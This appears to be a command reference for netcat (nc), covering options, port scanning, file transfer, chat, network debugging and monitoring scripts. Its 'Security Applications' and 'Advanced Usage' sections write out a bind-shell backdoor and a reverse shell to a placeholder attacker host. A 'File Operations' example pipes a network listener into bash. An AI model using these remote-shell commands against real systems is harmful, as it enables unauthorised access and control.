# nc (netcat)

## Overview
The `nc` (netcat) command is a versatile networking utility that can read and write data across network connections using TCP or UDP protocols. It's often called the "Swiss Army knife" of networking tools.

## Syntax
```bash
nc [options] [hostname] [port]
nc -l [options] [port]
```

## Common Options
| Option | Description |
|--------|-------------|
| `-l` | Listen mode |
| `-p port` | Specify port |
| `-u` | UDP mode |
| `-v` | Verbose output |
| `-n` | Don't resolve hostnames |
| `-z` | Zero-I/O mode (port scanning) |
| `-w timeout` | Connection timeout |
| `-k` | Keep listening after disconnect |
| `-4` | IPv4 only |
| `-6` | IPv6 only |
| `-e program` | Execute program |
| `-c command` | Execute command |

## Key Use Cases
1. Port scanning
2. Network debugging
3. File transfers
4. Chat/messaging
5. Service testing
6. Backdoor creation
7. Network troubleshooting

## Examples with Explanations
### Example 1: Port Scanning
```bash
nc -zv google.com 80
```
Tests if port 80 is open on Google

### Example 2: Listen on Port
```bash
nc -l 8080
```
Listens for connections on port 8080

### Example 3: Connect to Service
```bash
nc localhost 22
```
Connects to SSH service on localhost

### Example 4: File Transfer
```bash
# Receiver
nc -l 9999 > received_file.txt
# Sender
nc target_host 9999 < file_to_send.txt
```

## Port Scanning
1. Single port:
   ```bash
   nc -zv host 80
   ```
2. Port range:
   ```bash
   nc -zv host 20-25
   ```
3. Multiple ports:
   ```bash
   nc -zv host 22 80 443
   ```

## Network Testing
1. Test connectivity:
   ```bash
   nc -zv -w 3 host port
   ```
2. Banner grabbing:
   ```bash
   nc host 80
   GET / HTTP/1.0
   ```
3. Service testing:
   ```bash
   echo "QUIT" | nc mail.server.com 25
   ```

## File Transfer
1. Send file:
   ```bash
   # Receiver
   nc -l 1234 > received.txt
   # Sender
   nc receiver_ip 1234 < file.txt
   ```
2. Directory transfer:
   ```bash
   # Receiver
   nc -l 1234 | tar -xzf -
   # Sender
   tar -czf - directory/ | nc receiver_ip 1234
   ```

## Chat/Messaging
1. Simple chat:
   ```bash
   # Server
   nc -l 1234
   # Client
   nc server_ip 1234
   ```
2. Broadcast chat:
   ```bash
   # Server with named pipe
   mkfifo chat_pipe
   nc -l 1234 < chat_pipe | tee chat_pipe
   ```

## Advanced Usage
1. UDP mode:
   ```bash
   nc -u host port
   ```
2. Keep listening:
   ```bash
   nc -lk 1234
   ```
3. Execute commands:
   ```bash
   nc -l 1234 -e /bin/bash  # Security risk!
   ```

## Performance Analysis
- Lightweight and fast
- Minimal resource usage
- Good for quick tests
- Efficient for simple transfers
- Low overhead networking

## Related Commands
- `telnet` - Terminal emulation
- `ssh` - Secure shell
- `nmap` - Network scanner
- `socat` - Advanced networking
- `curl` - HTTP client

## Best Practices
1. Use for testing and debugging
2. Be cautious with -e option
3. Use timeouts for reliability
4. Combine with other tools
5. Consider security implications

## Security Applications
1. Backdoor (educational):
   ```bash
   # Target (dangerous!)
   nc -l 1234 -e /bin/bash
   # Attacker
   nc target_ip 1234
   ```
2. Reverse shell:
   ```bash
   # Attacker listens
   nc -l 1234
   # Target connects back
   nc attacker_ip 1234 -e /bin/bash
   ```

## Network Debugging
1. Test HTTP:
   ```bash
   printf "GET / HTTP/1.0\r\n\r\n" | nc google.com 80
   ```
2. Test SMTP:
   ```bash
   printf "EHLO test\r\nQUIT\r\n" | nc mail.server.com 25
   ```
3. Test DNS:
   ```bash
   nc -u 8.8.8.8 53
   ```

## Scripting Applications
1. Port availability check:
   ```bash
   #!/bin/bash
   check_port() {
       nc -z -w3 "$1" "$2" 2>/dev/null
       return $?
   }

   if check_port google.com 80; then
       echo "Port 80 is open"
   fi
   ```
2. Service monitoring:
   ```bash
   while true; do
       if ! nc -z localhost 80; then
           echo "Web server down!"
           # Restart service
       fi
       sleep 60
   done
   ```

## File Operations
1. Backup over network:
   ```bash
   # Backup server
   nc -l 9999 | gzip -d > backup.tar
   # Source server
   tar -cf - /data | gzip | nc backup_server 9999
   ```
2. Remote command execution:
   ```bash
   # Command server
   nc -l 1234 | bash
   # Client
   echo "ls -la" | nc server_ip 1234
   ```

## Integration Examples
1. With SSH tunneling:
   ```bash
   ssh -L 8080:internal_server:80 gateway_server
   nc localhost 8080
   ```
2. With cron for monitoring:
   ```bash
   # Check service every 5 minutes
   */5 * * * * nc -z localhost 80 || echo "Service down" | mail admin
   ```

## Troubleshooting
1. Connection refused
2. Timeout issues
3. Firewall blocking
4. Permission problems
5. Protocol mismatches

## Security Considerations
1. Never use -e in production
2. Firewall implications
3. Unencrypted communications
4. Potential for abuse
5. Monitor usage carefully

## Modern Alternatives
For enhanced functionality:
1. `socat` - More features
2. `nmap` - Better port scanning
3. `ssh` - Secure connections
4. `curl` - HTTP operations
5. `openssl s_client` - SSL testing

## Platform Differences
Different nc implementations:
- GNU netcat
- OpenBSD netcat
- Ncat (Nmap project)
- Traditional netcat

Check version:
```bash
nc -h 2>&1 | head -1
```